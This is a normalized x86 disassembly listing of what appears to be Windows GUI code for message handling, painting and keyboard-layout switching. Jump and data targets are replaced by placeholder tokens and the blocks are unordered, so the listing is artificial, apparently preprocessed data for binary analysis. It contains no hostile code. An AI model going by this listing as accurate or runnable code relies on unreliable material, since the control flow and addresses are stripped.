je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406864
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43850c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43b42c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413840
call sub_43b374
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413840
call sub_43b374
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43b4c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db40
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406850
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43b42c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406864
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43850c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43b554
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_437ac8
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_4385d8
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43b4c0
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406850
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_436e9c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43b42c
test eax eax
je r-xdata
mov eax ebx
call sub_44e0b4
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4385d8
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43db40
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43db40
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43850c
sub_43b6b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43876c
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43850c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41ca38
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_436ef8
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_43b7c0
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_434238
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43850c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43b7f4
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b91b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413840
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43b94c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_41389c
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413840
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41240c
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413840
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41bd78
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_41240c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41bd78
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41240c
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_435c94
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43850c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_43bb7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_435c94
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43db40
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43850c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43850c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_435c94
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_43bb7c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413840
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_43bcd0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43b7f4
jmp r-xdata
mov eax ebx
call sub_43a870
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43db40
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43850c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_43bcd0
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43db40
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_43be30
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43be50
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bec4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bee4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bf04
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bf28
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bf4c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bf70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43bf94
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42a64c
mov edi eax
mov eax edi
call sub_42a72c
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41ca38
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43db40
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42a82c
jmp r-xdata
sub_43c01c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_438e40
test bl bl
je r-xdata
mov eax edi
call sub_43de50
mov eax edi
call sub_43da48
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43da48
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43c0dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_438a9c
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43c12c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43de50
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43a400
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403430
sub_43c174
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_436e9c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43b42c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4568d8
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454dc0
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43c2c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c3aa
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43db40
mov dl [ ebx + 0x184 ]
call sub_442780
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d38
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ba4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b38
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b38
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b38
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43c3b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c441
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d38
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ba4
test eax eax
je r-xdata
mov eax ebx
call sub_43db40
mov dl 0x1
call sub_442764
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43c49c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4123fc
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43850c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43c4ec
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43c520
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403430
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403430
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43c560
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43850c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43c5b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4196e8
mov edx [ r-xdata ]
call sub_4033e4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43c5f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413840
jmp r-xdata
pop edi
pop esi
pop ebx
